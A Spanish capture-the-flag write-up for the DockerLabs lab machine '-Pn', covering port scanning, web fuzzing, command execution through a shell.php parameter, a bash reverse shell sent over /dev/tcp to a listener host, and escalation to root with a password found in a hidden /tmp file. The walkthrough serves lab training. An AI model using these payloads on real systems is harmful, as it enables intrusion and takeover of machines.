# [-Pn](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh pn.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).


## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)

`-c 1` ⮞ solo lo repite una vez<br>
<br>

Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **80**.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/b69f4026-cad2-4dfe-8a29-a6ea9f8ef44a)

<br>

Al ver que está abierto el puerto FTP vamos ha hacer un escaneo de nmap pero para que nos liste más información. Para llevar a cabo eso debemos hacer ```nmap -p21 -sCV 172.17.0.2 -oN targeted``` <br>
`-p21` ⮞ aplicar el escaneo solo al puerto 21 >
`-sC` ⮞ ejecuta los scripts de reconocimiento básico, los más comunes <br> 
`-sV` ⮞ para conocer la versión del servicio que corre por el puerto (se puede juntar con el anterior y quedaría así `-sCV`)<br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-oN` ⮞ lo exporta en formato nmap al archivo targeted
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/530c86d6-efde-4e04-8be6-468d27df3b57)

<br>
<br>

## Página Web (Puerto 80)

Al ver que aloja un servidor web, nos dirigimos a él poniendo en el buscador la ip que en este caso sería `172.17.0.2`. Dicha web tiene la siguiente apariencia:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/edb8225a-071e-47d2-ba92-8cb06fa05d83)

<br>

Si echamos un vistazo por la página vemos abajo del todo nos da una pequeña pista a tener en cuenta:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/06fe23b4-16f2-4cd4-8095-f03c15f84269)

<br>

Inspeccionamos el Código Fuente con `CTRL + U` pero no encontramos nada interesante, por lo que pasamos a hacer fuzzing con este comando <br>`gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2 -x txt,sql,py,js,php,html`<br>
Nos encuentra los siguientes archivos:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/e315816c-9bc5-448d-b864-077f91631082)

<br>

Vemos un archivo un poco extraño llamado `shell.php`, si nos dirigimos a la página web no nos aparece nada. Por lo que probaremos a hacerle fuzzing al parámetro de este archivo a ver si tiene alguno el cual nos permita ejecutar comando remotamente usaremos la herramienta `wfuzz` de la siguiente forma: `wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/shell.php?FUZZ=id --hc 404 --hl 0`, nos encuentra lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/6fc866f7-331b-4f59-bb03-eb54c4ad3d35)

<br>

Por lo que nos vamos a la web y en la URL introducimos `http://172.17.0.2/shell.php?parameter=id`, comprobamos que estamos ante una RCE.
<br>

Sabiendo que podemos ejecutar comandos remotamente nos enviaremos una [revshell](https://www.revshells.com/). 

<br>

En primer lugar, nos pondremos en escucha por el puerto especificado, en este caso el `443` con el siguiente comando `nc -nlvp 443`.

<br>

En segundo lugar, le pasamos de valor a `parameter` lo siguiente `bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, por lo tanto la URL quedaría así `172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, vemos que la página web se queda cargando y recibiremos la reverse shell:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/28d5cfd0-1400-48a6-8410-e27c0278322d)

<br>
<br>

## Escalada de Privilegios

Comprobamos que hemos accedido a la máquina como **www-data**:
<br>

 > El (;) concatena dos comandos.

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/e3d0974c-19ab-4f5a-838e-4800b942e188)

<br>

El primer lugar, haremos un Tratamiento de la TTY ejecutando en orden las siguientes infracciones: <br>
1-.`script /dev/null -c bash` <br>
2-.`Pulsamos CTRL+Z` <br>
3-.`stty raw -echo; fg` <br>
4-.`reset xterm` <br>
5-.`export SHELL=bash && export TERM=xterm` <br>

<br>

Ejecutamos el comando `sudo -l` para ver que podemos ejecutar como sudo, pero no encontramos nada: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/95fb08c9-21e9-4b8a-ac90-a167c34be2dc)

<br>

Al igual que si ejecutamos `find / -perm -4000 2>/dev/null` en búsqueda de permisos SUID no encontramos nada potencial para escalar privilegios. 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d1835fdd-3a85-4a79-a1af-46fb2da486b5)

`/` ⮞ buscamos desde la raíz <br>
`-perm -4000` ⮞ mostrar los permisos SUID <br>
`2>/dev/null` ⮞ para que no nos muestre los errores 

<br>

Si recordamos en la página web nos dió la siguiente pista:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/06fe23b4-16f2-4cd4-8095-f03c15f84269)

<br>

Por lo que nos dirigimos al directorio `/tmp`, y si hacemos `ls` no vemos nada pero si hacemos `ls -la` observamos un archivo oculto `.secret.txt`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/fe0b5ab0-b49b-45c1-87d9-47f9e41f38fe)

<br>

El contenido de este archivo es el siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/9ad4268b-00fb-4d08-9580-7027c5f53328)

<br>

Por lo que probamos a autenticarnos como **root** haciendo `su root`, ponemos de contraseña `contraseñaderoot123`, y listo ya somos **root!**
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/645487d7-bf3d-457c-90a8-b447b682de84)
